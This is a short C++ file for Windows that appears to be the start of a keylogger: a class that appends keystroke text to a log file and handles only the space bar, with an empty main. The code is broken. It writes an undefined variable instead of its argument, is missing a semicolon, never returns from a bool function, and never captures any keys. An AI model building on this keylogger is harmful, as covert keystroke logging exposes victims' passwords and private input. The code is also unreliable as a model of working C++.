#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std;
class Keylogger{
public:
	void WriteToFile(string file_name){
		ofstream logkey; //Create object for file stream
		logkey.open(file_name,fstream::app);
		logkey << text; //Write text string to file
		logkey.close();
	}
bool CheckListKey(int key){
switch(key){
	case VK_SPACE:
	cout << " ";//If space bar is pressed this will be logged as " "
	this->WriteToFile(" ")
}
}
}

int main(){
Keylogger keylog;
Keylogger *keys = &keylog;
return 0;
}
